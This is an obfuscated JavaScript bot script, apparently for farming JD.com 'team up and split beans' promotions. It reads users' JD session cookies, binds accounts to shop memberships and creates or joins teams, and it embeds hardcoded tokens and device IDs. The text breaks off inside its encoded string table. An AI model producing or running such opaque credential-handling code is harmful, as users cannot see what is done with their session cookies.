/*
活动地址为：https://cjhydz-isv.isvjcloud.com/wxTeam/activity?activityId=xxxxx
一共有2个变量
jd_cjhy_activityId  活动ID 必需
jd_cjhy_activityUrl 活动地址 必需

cron:10 10 10 10 *
============Quantumultx===============
[task_local]
#CJ组队瓜分京豆
10 10 10 10 * jd_cjzdgf.js, tag=CJ组队瓜分京豆, enabled=true

*/

let jd_cjhy_activityId="2584bc5fb137415c87cedbb2e56bda3c" // 活动ID
let jd_cjhy_activityUrl="https://cjhydz-isv.isvjcloud.com" // 活动地址

var _0xodz='jsjiami.com.v6',_0xodz_=['_0xodz'],_0x4105=[_0xodz,'\x43\x4a\u7ec4\u961f\u74dc\u5206\u4eac\u8c46','\x69\x73\x4e\x6f\x64\x65','\x2e\x2f\x73\x65\x6e\x64\x4e\x6f\x74\x69\x66\x79','\x2e\x2f\x6a\x64\x43\x6f\x6f\x6b\x69\x65\x2e\x6a\x73','\x67\x65\x74\x64\x61\x74\x61','\x6a\x64\x5f\x6b\x72\x5f\x63\x6a\x68\x79\x5f\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64','\x6a\x64\x5f\x6b\x72\x5f\x63\x6a\x68\x79\x5f\x61\x63\x74\x69\x76\x69\x74\x79\x55\x72\x6c','\x65\x6e\x76','\x6a\x64\x5f\x63\x6a\x68\x79\x5f\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64','\x6a\x64\x5f\x63\x6a\x68\x79\x5f\x61\x63\x74\x69\x76\x69\x74\x79\x55\x72\x6c','\x73\x74\x72\x69\x6e\x67\x69\x66\x79','\x69\x6e\x64\x65\x78\x4f\x66','\x47\x49\x54\x48\x55\x42','\x65\x78\x69\x74','\x6b\x65\x79\x73','\x66\x6f\x72\x45\x61\x63\x68','\x70\x75\x73\x68','\x4a\x44\x5f\x44\x45\x42\x55\x47','\x66\x61\x6c\x73\x65','\x6c\x6f\x67','\x43\x6f\x6f\x6b\x69\x65\x4a\x44','\x43\x6f\x6f\x6b\x69\x65\x4a\x44\x32','\x74\x6f\x4f\x62\x6a','\x43\x6f\x6f\x6b\x69\x65\x73\x4a\x44','\x6d\x61\x70','\x63\x6f\x6f\x6b\x69\x65','\x66\x69\x6c\x74\x65\x72','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x6d\x2e\x6a\x64\x2e\x63\x6f\x6d\x2f\x63\x6c\x69\x65\x6e\x74\x2e\x61\x63\x74\x69\x6f\x6e','\x75\x6e\x64\x65\x66\x69\x6e\x65\x64','\x64\x6f\x6e\x65','\x6d\x73\x67','\x6e\x61\x6d\x65','\u6d3b\u52a8\x69\x64\u4e0d\u5b58\u5728','\u3010\u63d0\u793a\u3011\u8bf7\u5148\u83b7\u53d6\u4eac\u4e1c\u8d26\u53f7\u4e00\x63\x6f\x6f\x6b\x69\x65\x0a\u76f4\u63a5\u4f7f\u7528\x4e\x6f\x62\x79\x44\x61\u7684\u4eac\u4e1c\u7b7e\u5230\u83b7\u53d6','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x62\x65\x61\x6e\x2e\x6d\x2e\x6a\x64\x2e\x63\x6f\x6d\x2f','\x6d\x65\x6d\x62\x65\x72\x43\x6f\x75\x6e\x74','\u6d3b\u52a8\x69\x64\x3a\x0a','\x74\x6f\x61\x63\x74\x69\x76\x69\x74\x79','\x6c\x65\x6e\x67\x74\x68','\x55\x73\x65\x72\x4e\x61\x6d\x65','\x6d\x61\x74\x63\x68','\x69\x6e\x64\x65\x78','\x69\x73\x4c\x6f\x67\x69\x6e','\x6e\x69\x63\x6b\x4e\x61\x6d\x65','\x0a\x2a\x2a\x2a\x2a\x2a\x2a\u5f00\u59cb\u3010\u4eac\u4e1c\u8d26\u53f7','\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x0a','\u3010\u63d0\u793a\u3011\x63\x6f\x6f\x6b\x69\x65\u5df2\u5931\u6548','\u4eac\u4e1c\u8d26\u53f7','\x0a\u8bf7\u91cd\u65b0\u767b\u5f55\u83b7\u53d6\x0a\x68\x74\x74\x70\x73\x3a\x2f\x2f\x62\x65\x61\x6e\x2e\x6d\x2e\x6a\x64\x2e\x63\x6f\x6d\x2f','\x73\x65\x6e\x64\x4e\x6f\x74\x69\x66\x79','\x63\x6f\x6f\x6b\x69\x65\u5df2\u5931\u6548\x20\x2d\x20','\x0a\u8bf7\u91cd\u65b0\u767b\u5f55\u83b7\u53d6\x63\x6f\x6f\x6b\x69\x65','\x6d\x61\x78\x54\x65\x61\x6d','\u961f\u4f0d\u4eba\u6570\x20','\x63\x61\x74\x63\x68','\x2c\x20\u5931\u8d25\x21\x20\u539f\u56e0\x3a\x20','\x66\x69\x6e\x61\x6c\x6c\x79','\x73\x69\x64','\x75\x73\x65\x72\x49\x64','\x36\x39\x31\x33\x39\x39','\x54\x6f\x6b\x65\x6e','\x50\x69\x6e','\x68\x69\x73\x50\x69\x6e','\x63\x61\x72\x64','\x73\x61\x76\x65\x54\x65\x61\x6d','\u83b7\u53d6\x5b\x74\x6f\x6b\x65\x6e\x5d\u5931\u8d25\uff01','\x41\x55\x54\x48\x5f\x43\x5f\x55\x53\x45\x52','\x46\x34\x65\x56\x2b\x46\x74\x63\x45\x64\x54\x4e\x4f\x43\x4c\x77\x6d\x52\x67\x4f\x45\x74\x41\x31\x44\x72\x71\x33\x7a\x61\x34\x6c\x68\x36\x4c\x46\x4c\x66\x6c\x65\x64\x46\x31\x63\x64\x53\x69\x71\x4d\x62\x43\x78\x35\x65\x64\x45\x45\x61\x4c\x33\x52\x6e\x43\x53\x6b\x64\x4b\x33\x72\x4c\x42\x51\x70\x45\x51\x48\x39\x56\x34\x74\x64\x72\x72\x68\x30\x77\x3d\x3d','\x77\x61\x69\x74','\x70\x69\x6e\x3a','\u961f\u4f0d\u5df2\u6ee1\u5458','\u3010\u4eac\u4e1c\u8d26\u53f7','\u3011\x20\u672a\u80fd\u83b7\u53d6\u6d3b\u52a8\u4fe1\u606f','\u3011\x20\u672a\u80fd\u83b7\u53d6\u6d3b\u52a8\u4fe1\u606f\x0a','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x6a\x68\x79\x64\x7a\x2d\x69\x73\x76\x2e\x69\x73\x76\x6a\x63\x6c\x6f\x75\x64\x2e\x63\x6f\x6d\x2f\x77\x78\x43\x6f\x6d\x6d\x6f\x6e\x49\x6e\x66\x6f\x2f\x67\x65\x74\x53\x79\x73\x74\x65\x6d\x43\x6f\x6e\x66\x69\x67','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x6a\x68\x79\x64\x7a\x2d\x69\x73\x76\x2e\x69\x73\x76\x6a\x63\x6c\x6f\x75\x64\x2e\x63\x6f\x6d\x2f\x77\x78\x54\x65\x61\x6d\x2f\x61\x63\x74\x69\x76\x69\x74\x79\x3f\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64\x3d','\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64','\x26\x73\x68\x61\x72\x65\x55\x75\x69\x64\x3d','\x73\x68\x61\x72\x65\x55\x75\x69\x64','\x67\x65\x74','\x74\x6f\x53\x74\x72','\x20\x63\x6f\x6f\x6b\x69\x65\x20\x41\x50\x49\u8bf7\u6c42\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u7f51\u8def\u91cd\u8bd5','\x68\x65\x61\x64\x65\x72\x73','\x73\x65\x74\x2d\x63\x6f\x6f\x6b\x69\x65','\x53\x65\x74\x2d\x43\x6f\x6f\x6b\x69\x65','\x6f\x62\x6a\x65\x63\x74','\x73\x70\x6c\x69\x74','\x74\x72\x69\x6d','\x4c\x5a\x5f\x54\x4f\x4b\x45\x4e\x5f\x4b\x45\x59\x3d','\x72\x65\x70\x6c\x61\x63\x65','\x4c\x5a\x5f\x54\x4f\x4b\x45\x4e\x5f\x56\x41\x4c\x55\x45\x3d','\x6c\x6f\x67\x45\x72\x72','\x6a\x64\x61\x70\x70\x3b\x69\x50\x68\x6f\x6e\x65\x3b\x31\x30\x2e\x33\x2e\x30\x3b\x3b\x3b\x4d\x2f\x35\x2e\x30\x3b\x61\x70\x70\x42\x75\x69\x6c\x64\x2f\x31\x36\x37\x39\x30\x33\x3b\x6a\x64\x53\x75\x70\x70\x6f\x72\x74\x44\x61\x72\x6b\x4d\x6f\x64\x65\x2f\x30\x3b\x65\x66\x2f\x31\x3b\x65\x70\x2f\x25\x37\x42\x25\x32\x32\x63\x69\x70\x68\x65\x72\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x35\x25\x32\x43\x25\x32\x32\x63\x69\x70\x68\x65\x72\x25\x32\x32\x25\x33\x41\x25\x37\x42\x25\x32\x32\x75\x64\x25\x32\x32\x25\x33\x41\x25\x32\x32\x5a\x57\x59\x35\x59\x74\x54\x76\x59\x77\x56\x73\x43\x7a\x59\x34\x44\x57\x59\x6e\x59\x32\x56\x74\x44\x4e\x55\x30\x5a\x74\x56\x77\x43\x4e\x55\x32\x45\x51\x54\x74\x5a\x74\x59\x31\x44\x74\x54\x75\x44\x74\x75\x34\x44\x6d\x25\x33\x44\x25\x33\x44\x25\x32\x32\x25\x32\x43\x25\x32\x32\x73\x76\x25\x32\x32\x25\x33\x41\x25\x32\x32\x43\x4a\x47\x6b\x45\x4b\x25\x33\x44\x25\x33\x44\x25\x32\x32\x25\x32\x43\x25\x32\x32\x69\x61\x64\x25\x32\x32\x25\x33\x41\x25\x32\x32\x25\x32\x32\x25\x37\x44\x25\x32\x43\x25\x32\x32\x74\x73\x25\x32\x32\x25\x33\x41\x31\x36\x34\x35\x30\x36\x38\x35\x34\x39\x25\x32\x43\x25\x32\x32\x68\x64\x69\x64\x25\x32\x32\x25\x33\x41\x25\x32\x32\x4a\x4d\x39\x46\x31\x79\x77\x55\x50\x77\x66\x6c\x76\x4d\x49\x70\x59\x50\x6f\x6b\x30\x74\x74\x35\x6b\x39\x6b\x57\x34\x41\x72\x4a\x45\x55\x33\x6c\x66\x4c\x68\x78\x42\x71\x77\x25\x33\x44\x25\x32\x32\x25\x32\x43\x25\x32\x32\x76\x65\x72\x73\x69\x6f\x6e\x25\x32\x32\x25\x33\x41\x25\x32\x32\x31\x2e\x30\x2e\x33\x25\x32\x32\x25\x32\x43\x25\x32\x32\x61\x70\x70\x6e\x61\x6d\x65\x25\x32\x32\x25\x33\x41\x25\x32\x32\x63\x6f\x6d\x2e\x33\x36\x30\x62\x75\x79\x2e\x6a\x64\x6d\x6f\x62\x69\x6c\x65\x25\x32\x32\x25\x32\x43\x25\x32\x32\x72\x69\x64\x78\x25\x32\x32\x25\x33\x41\x2d\x31\x25\x37\x44\x3b\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x69\x50\x68\x6f\x6e\x65\x3b\x20\x43\x50\x55\x20\x69\x50\x68\x6f\x6e\x65\x20\x4f\x53\x20\x31\x34\x5f\x38\x20\x6c\x69\x6b\x65\x20\x4d\x61\x63\x20\x4f\x53\x20\x58\x29\x20\x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x36\x30\x35\x2e\x31\x2e\x31\x35\x20\x28\x4b\x48\x54\x4d\x4c\x2c\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x29\x20\x4d\x6f\x62\x69\x6c\x65\x2f\x31\x35\x45\x31\x34\x38\x3b\x73\x75\x70\x70\x6f\x72\x74\x4a\x44\x53\x48\x57\x4b\x2f\x31\x3b','\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64\x3d','\x70\x6f\x73\x74','\x2f\x63\x75\x73\x74\x6f\x6d\x65\x72\x2f\x67\x65\x74\x53\x69\x6d\x70\x6c\x65\x41\x63\x74\x49\x6e\x66\x6f\x56\x6f','\x20\x67\x65\x74\x53\x69\x6d\x70\x6c\x65\x41\x63\x74\x49\x6e\x66\x6f\x56\x6f\x20\x41\x50\x49\u8bf7\u6c42\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u7f51\u8def\u91cd\u8bd5','\x73\x74\x61\x74\x75\x73','\x61\x62\x63\x64\x65\x66\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39','\x63\x68\x61\x72\x41\x74','\x66\x6c\x6f\x6f\x72','\x72\x61\x6e\x64\x6f\x6d','\x2f\x77\x78\x54\x65\x61\x6d\x2f\x61\x63\x74\x69\x76\x69\x74\x79\x3f\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64\x3d','\x61\x64\x69\x64\x3d\x37\x42\x34\x31\x31\x43\x44\x39\x2d\x44\x36\x32\x43\x2d\x34\x32\x35\x42\x2d\x42\x30\x38\x33\x2d\x39\x41\x46\x43\x34\x39\x42\x39\x34\x32\x32\x38\x26\x61\x72\x65\x61\x3d\x31\x36\x5f\x31\x33\x33\x32\x5f\x34\x32\x39\x33\x32\x5f\x34\x33\x31\x30\x32\x26\x62\x6f\x64\x79\x3d\x25\x37\x42\x25\x32\x32\x75\x72\x6c\x25\x32\x32\x25\x33\x41\x25\x32\x32\x68\x74\x74\x70\x73\x25\x33\x41\x25\x35\x43\x2f\x25\x35\x43\x2f\x63\x6a\x68\x79\x64\x7a\x2d\x69\x73\x76\x2e\x69\x73\x76\x6a\x63\x6c\x6f\x75\x64\x2e\x63\x6f\x6d\x25\x32\x32\x25\x32\x43\x25\x32\x32\x69\x64\x25\x32\x32\x25\x33\x41\x25\x32\x32\x25\x32\x32\x25\x37\x44\x26\x62\x75\x69\x6c\x64\x3d\x31\x36\x37\x35\x34\x31\x26\x63\x6c\x69\x65\x6e\x74\x3d\x61\x70\x70\x6c\x65\x26\x63\x6c\x69\x65\x6e\x74\x56\x65\x72\x73\x69\x6f\x6e\x3d\x39\x2e\x34\x2e\x30\x26\x64\x5f\x62\x72\x61\x6e\x64\x3d\x61\x70\x70\x6c\x65\x26\x64\x5f\x6d\x6f\x64\x65\x6c\x3d\x69\x50\x68\x6f\x6e\x65\x38\x25\x32\x43\x31\x26\x65\x69\x64\x3d\x65\x69\x64\x49\x64\x31\x30\x62\x38\x31\x32\x31\x39\x31\x73\x65\x42\x43\x46\x47\x6d\x74\x62\x65\x54\x58\x32\x76\x58\x46\x33\x6c\x62\x67\x44\x41\x56\x77\x51\x68\x53\x41\x38\x77\x4b\x71\x6a\x36\x4f\x41\x39\x4a\x34\x66\x6f\x50\x51\x6d\x33\x55\x7a\x52\x77\x72\x72\x4c\x64\x4f\x32\x33\x42\x33\x45\x32\x77\x43\x55\x59\x2f\x62\x4f\x44\x48\x30\x31\x56\x6e\x78\x69\x45\x6e\x41\x55\x76\x6f\x4d\x36\x53\x69\x45\x6e\x6d\x50\x33\x49\x50\x71\x52\x75\x4f\x25\x32\x42\x79\x2f\x25\x32\x42\x5a\x6f\x26\x69\x73\x42\x61\x63\x6b\x67\x72\x6f\x75\x6e\x64\x3d\x4e\x26\x6a\x6f\x79\x63\x69\x6f\x75\x73\x3d\x34\x38\x26\x6c\x61\x6e\x67\x3d\x7a\x68\x5f\x43\x4e\x26\x6e\x65\x74\x77\x6f\x72\x6b\x54\x79\x70\x65\x3d\x77\x69\x66\x69\x26\x6e\x65\x74\x77\x6f\x72\x6b\x6c\x69\x62\x74\x79\x70\x65\x3d\x4a\x44\x4e\x65\x74\x77\x6f\x72\x6b\x42\x61\x73\x65\x41\x46\x26\x6f\x70\x65\x6e\x75\x64\x69\x64\x3d\x32\x66\x37\x35\x37\x38\x63\x62\x36\x33\x34\x30\x36\x35\x66\x39\x62\x65\x61\x65\x39\x34\x64\x30\x31\x33\x66\x31\x37\x32\x65\x31\x39\x37\x64\x36\x32\x32\x38\x33\x26\x6f\x73\x56\x65\x72\x73\x69\x6f\x6e\x3d\x31\x33\x2e\x31\x2e\x32\x26\x70\x61\x72\x74\x6e\x65\x72\x3d\x61\x70\x70\x6c\x65\x26\x72\x66\x73\x3d\x30\x30\x30\x30\x26\x73\x63\x6f\x70\x65\x3d\x31\x31\x26\x73\x63\x72\x65\x65\x6e\x3d\x37\x35\x30\x25\x32\x41\x31\x33\x33\x34\x26\x73\x69\x67\x6e\x3d\x36\x30\x62\x64\x65\x35\x31\x62\x34\x62\x37\x66\x37\x66\x66\x36\x65\x31\x62\x63\x31\x66\x34\x37\x33\x65\x63\x66\x33\x64\x34\x31\x26\x73\x74\x3d\x31\x36\x31\x33\x37\x32\x30\x32\x30\x33\x39\x30\x33\x26\x73\x76\x3d\x31\x31\x30\x26\x75\x74\x73\x3d\x30\x66\x33\x31\x54\x56\x52\x6a\x42\x53\x74\x47\x39\x4e\x6f\x5a\x4a\x64\x58\x4c\x47\x64\x39\x33\x39\x57\x76\x34\x41\x6c\x73\x57\x4e\x41\x65\x4c\x31\x6e\x78\x61\x66\x55\x73\x5a\x71\x69\x56\x34\x4e\x4c\x73\x56\x45\x6c\x7a\x36\x41\x6a\x43\x34\x4c\x37\x74\x73\x6e\x5a\x31\x6c\x6f\x65\x54\x32\x41\x38\x5a\x35\x2f\x4b\x66\x49\x2f\x59\x6f\x4a\x41\x55\x66\x4a\x7a\x54\x64\x38\x6b\x43\x65\x64\x66\x6e\x4c\x47\x35\x32\x32\x79\x64\x49\x30\x70\x34\x30\x6f\x69\x38\x68\x54\x32\x70\x32\x73\x4e\x5a\x69\x49\x49\x52\x59\x43\x66\x6a\x49\x72\x37\x49\x41\x4c\x25\x32\x42\x46\x6b\x4c\x73\x72\x57\x64\x53\x69\x50\x5a\x50\x35\x51\x4c\x70\x74\x63\x38\x43\x79\x34\x4f\x64\x36\x2f\x63\x64\x59\x69\x64\x43\x6c\x52\x30\x4e\x77\x50\x4d\x64\x35\x38\x4b\x35\x4a\x39\x6e\x61\x72\x7a\x37\x38\x79\x39\x6f\x63\x47\x65\x38\x75\x54\x66\x79\x42\x49\x6f\x41\x39\x61\x43\x64\x2f\x58\x33\x4d\x75\x78\x77\x25\x33\x44\x25\x33\x44\x26\x75\x75\x69\x64\x3d\x68\x6a\x75\x64\x77\x67\x6f\x68\x78\x7a\x56\x75\x39\x36\x6b\x72\x76\x2f\x54\x36\x48\x67\x25\x33\x44\x25\x33\x44\x26\x77\x69\x66\x69\x42\x73\x73\x69\x64\x3d\x39\x63\x66\x39\x30\x63\x35\x38\x36\x63\x34\x34\x36\x38\x65\x30\x30\x36\x37\x38\x35\x34\x35\x62\x31\x36\x31\x37\x36\x65\x64\x32','\x3f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x49\x64\x3d\x69\x73\x76\x4f\x62\x66\x75\x73\x63\x61\x74\x6f\x72','\x20\x32\x20\x41\x50\x49\u8bf7\u6c42\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u7f51\u8def\u91cd\u8bd5','\x70\x61\x72\x73\x65','\x63\x6f\x64\x65','\x74\x6f\x6b\x65\x6e','\u5f02\u5e38\x32\uff1a','\x75\x73\x65\x72\x49\x64\x3d','\x26\x74\x6f\x6b\x65\x6e\x3d','\x26\x66\x72\x6f\x6d\x54\x79\x70\x65\x3d\x41\x50\x50\x26\x72\x69\x73\x6b\x54\x79\x70\x65\x3d\x31','\x2f\x63\x75\x73\x74\x6f\x6d\x65\x72\x2f\x67\x65\x74\x4d\x79\x50\x69\x6e\x67','\x20\x33\x20\x41\x50\x49\u8bf7\u6c42\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u7f51\u8def\u91cd\u8bd5','\x72\x65\x73\x75\x6c\x74','\x64\x61\x74\x61','\x73\x65\x63\x72\x65\x74\x50\x69\x6e','\u5f02\u5e38\x33\uff1a','\x2f\x77\x78\x54\x65\x61\x6d\x2f\x73\x68\x6f\x70\x49\x6e\x66\x6f','\x20\x31\x20\x41\x50\x49\u8bf7\u6c42\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u7f51\u8def\u91cd\u8bd5','\x73\x68\x6f\x70\x4e\x61\x6d\x65','\u5f02\u5e38\x31\uff1a','\x76\x65\x6e\x64\x65\x72\x49\x64\x3d','\x26\x62\x75\x79\x65\x72\x50\x69\x6e\x3d','\x2f\x6d\x63\x2f\x6e\x65\x77\x2f\x62\x72\x61\x6e\x64\x43\x61\x72\x64\x2f\x63\x6f\x6d\x6d\x6f\x6e\x2f\x73\x68\x6f\x70\x41\x6e\x64\x42\x72\x61\x6e\x64\x2f\x67\x65\x74\x4f\x70\x65\x6e\x43\x61\x72\x64\x49\x6e\x66\x6f','\x41\x50\x49\u8bf7\u6c42\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u7f51\u8def\u91cd\u8bd5','\x6f\x70\x65\x6e\x43\x61\x72\x64\x4c\x69\x6e\x6b','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x6d\x2e\x6a\x64\x2e\x63\x6f\x6d\x2f\x63\x6c\x69\x65\x6e\x74\x2e\x61\x63\x74\x69\x6f\x6e\x3f\x61\x70\x70\x69\x64\x3d\x6a\x64\x5f\x73\x68\x6f\x70\x5f\x6d\x65\x6d\x62\x65\x72\x26\x66\x75\x6e\x63\x74\x69\x6f\x6e\x49\x64\x3d\x62\x69\x6e\x64\x57\x69\x74\x68\x56\x65\x6e\x64\x65\x72\x26\x62\x6f\x64\x79\x3d','\x26\x63\x6c\x69\x65\x6e\x74\x3d\x48\x35\x26\x63\x6c\x69\x65\x6e\x74\x56\x65\x72\x73\x69\x6f\x6e\x3d\x39\x2e\x32\x2e\x30\x26\x75\x75\x69\x64\x3d\x38\x38\x38\x38\x38\x26\x6a\x73\x6f\x6e\x70\x3d\x6a\x73\x6f\x6e\x70\x5f\x31\x36\x31\x33\x37\x31\x38\x33\x33\x33\x33\x31\x37\x5f\x35\x34\x34\x38\x39','\u5f02\u5e38\x34\uff1a','\x2a\x2f\x2a','\x67\x7a\x69\x70\x2c\x20\x64\x65\x66\x6c\x61\x74\x65\x2c\x20\x62\x72','\x7a\x68\x2d\x63\x6e','\x6b\x65\x65\x70\x2d\x61\x6c\x69\x76\x65','\x61\x70\x69\x2e\x6d\x2e\x6a\x64\x2e\x63\x6f\x6d','\x20\u5165\u4f1a\x20\x41\x50\x49\u8bf7\u6c42\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u7f51\u8def\u91cd\u8bd5','\x70\x69\x6e\x3d','\x2f\x77\x78\x41\x63\x74\x69\x6f\x6e\x43\x6f\x6d\x6d\x6f\x6e\x2f\x67\x65\x74\x55\x73\x65\x72\x49\x6e\x66\x6f','\x20\x36\x2d\x31\x20\x41\x50\x49\u8bf7\u6c42\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u7f51\u8def\u91cd\u8bd5','\x61\x74\x74\x72\x54\x6f\x75\x58\x69\x61\x6e\x67','\x79\x75\x6e\x4d\x69\x64\x49\x6d\x61\x67\x65\x55\x72\x6c','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x69\x6d\x67\x31\x30\x2e\x33\x36\x30\x62\x75\x79\x69\x6d\x67\x2e\x63\x6f\x6d\x2f\x69\x6d\x67\x7a\x6f\x6e\x65\x2f\x6a\x66\x73\x2f\x74\x31\x2f\x32\x31\x33\x38\x33\x2f\x32\x2f\x36\x36\x33\x33\x2f\x33\x38\x37\x39\x2f\x35\x63\x35\x31\x33\x38\x64\x38\x45\x30\x39\x36\x37\x63\x63\x66\x32\x2f\x39\x31\x64\x61\x35\x37\x63\x35\x65\x32\x31\x36\x36\x30\x30\x35\x2e\x6a\x70\x67','\u5f02\u5e38\x36\x2d\x32\uff1a','\x26\x70\x69\x6e\x3d','\x73\x69\x67\x6e\x55\x75\x69\x64','\x26\x73\x69\x67\x6e\x55\x75\x69\x64\x3d','\x2f\x77\x78\x54\x65\x61\x6d\x2f\x61\x63\x74\x69\x76\x69\x74\x79\x43\x6f\x6e\x74\x65\x6e\x74','\x20\x35\x20\x41\x50\x49\u8bf7\u6c42\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u7f51\u8def\u91cd\u8bd5','\x61\x63\x74\x69\x76\x65','\x65\x6e\x64\x54\x69\x6d\x65\x53\x74\x72','\x67\x65\x74\x54\x69\x6d\x65','\u6d3b\u52a8\u7ed3\u675f','\u6d3b\u52a8\u7ed3\u675f\x0a','\x63\x61\x6e\x43\x72\x65\x61\x74\x65','\x6c\x69\x73\x74','\u4eba\u6570\u5df2\u6ee1\x0a','\x73\x68\x61\x72\x65','\x74\x65\x61\x6d\x4e\x75\x6d','\x61\x63\x74\x52\x75\x6c\x65','\u6700\u591a\u53ef\u4ee5\u7ec4\u5efa','\u4e2a\u6218\u961f','\u52a0\u5165\u961f\u4f0d\x20\x69\x64\x3a\x20','\u961f\u4f0d\x69\x64\x3a\x20','\u3011\x20\u521b\u5efa\u961f\u4f0d\x69\x64\x3a\x20','\u5f02\u5e38\x35\uff1a','\x26\x70\x69\x6e\x49\x6d\x67\x3d','\x2f\x77\x78\x54\x65\x61\x6d\x2f\x73\x61\x76\x65\x43\x61\x70\x74\x61\x69\x6e','\x20\x36\x20\x41\x50\x49\u8bf7\u6c42\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u7f51\u8def\u91cd\u8bd5','\u521b\u5efa\u961f\u4f0d\u6210\u529f\x20\x69\x64\x3a\x20','\u5f02\u5e38\x36\uff1a','\x65\x72\x72\x6f\x72\x4d\x65\x73\x73\x61\x67\x65','\u4e0d\u662f\u5e97\u94fa\u4f1a\u5458','\u5956\u54c1\u4e0e\u60a8\u64e6\u80a9\u800c\u8fc7','\x2f\x77\x78\x54\x65\x61\x6d\x2f\x73\x61\x76\x65\x4d\x65\x6d\x62\x65\x72','\x20\x37\x20\x41\x50\x49\u8bf7\u6c42\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u7f51\u8def\u91cd\u8bd5','\u3011\x20\u52a0\u5165\u961f\u4f0d\x0a','\u52a0\u5165\u961f\u4f0d\u6210\u529f','\u961f\u4f0d\u5df2\u7ecf\u6ee1\u5458','\u5f02\u5e38\x37\uff1a','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x6a\x68\x79\x64\x7a\x2d\x69\x73\x76\x2e\x69\x73\x76\x6a\x63\x6c\x6f\x75\x64\x2e\x63\x6f\x6d\x2f\x6d\x69\x63\x72\x6f\x44\x7a\x2f\x69\x6e\x76\x69\x74\x65\x2f\x61\x63\x74\x69\x76\x69\x74\x79\x2f\x77\x78\x2f\x67\x65\x74\x4f\x70\x65\x6e\x43\x61\x72\x64\x41\x6c\x6c\x53\x74\x61\x74\x75\x65\x73\x4e\x65\x77','\x3b\x49\x73\x76\x54\x6f\x6b\x65\x6e\x3d','\x3b\x41\x55\x54\x48\x5f\x43\x5f\x55\x53\x45\x52\x3d','\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x2d\x77\x77\x77\x2d\x66\x6f\x72\x6d\x2d\x75\x72\x6c\x65\x6e\x63\x6f\x64\x65\x64\x3b\x20\x63\x68\x61\x72\x73\x65\x74\x3d\x55\x54\x46\x2d\x38','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x6a\x68\x79\x64\x7a\x2d\x69\x73\x76\x2e\x69\x73\x76\x6a\x63\x6c\x6f\x75\x64\x2e\x63\x6f\x6d\x2f\x6d\x69\x63\x72\x6f\x44\x7a\x2f\x69\x6e\x76\x69\x74\x65\x2f\x61\x63\x74\x69\x76\x69\x74\x79\x2f\x77\x78\x2f\x76\x69\x65\x77\x2f\x69\x6e\x64\x65\x78\x3f\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64\x3d','\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e\x2c\x20\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x2c\x20\x2a\x2f\x2a\x3b\x20\x71\x3d\x30\x2e\x30\x31','\x69\x73\x49\x6e\x76\x69\x74\x65\x64\x3d\x30\x26\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64\x3d','\x69\x73\x43\x61\x6e\x4a\x6f\x69\x6e','\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e','\x63\x6a\x68\x79\x64\x7a\x2d\x69\x73\x76\x2e\x69\x73\x76\x6a\x63\x6c\x6f\x75\x64\x2e\x63\x6f\x6d','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x6a\x68\x79\x64\x7a\x2d\x69\x73\x76\x2e\x69\x73\x76\x6a\x63\x6c\x6f\x75\x64\x2e\x63\x6f\x6d','\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x2d\x77\x77\x77\x2d\x66\x6f\x72\x6d\x2d\x75\x72\x6c\x65\x6e\x63\x6f\x64\x65\x64','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x71\x2e\x6a\x64\x2e\x63\x6f\x6d\x2f\x75\x73\x65\x72\x2f\x69\x6e\x66\x6f\x2f\x51\x75\x65\x72\x79\x4a\x44\x55\x73\x65\x72\x49\x6e\x66\x6f\x3f\x73\x63\x65\x6e\x65\x76\x61\x6c\x3d\x32','\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e\x2c\x74\x65\x78\x74\x2f\x70\x6c\x61\x69\x6e\x2c\x20\x2a\x2f\x2a','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x71\x73\x2e\x6a\x64\x2e\x63\x6f\x6d\x2f\x6d\x79\x2f\x6a\x69\x6e\x67\x64\x6f\x75\x2f\x6d\x79\x2e\x73\x68\x74\x6d\x6c\x3f\x73\x63\x65\x6e\x65\x76\x61\x6c\x3d\x32','\x20\x41\x50\x49\u8bf7\u6c42\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5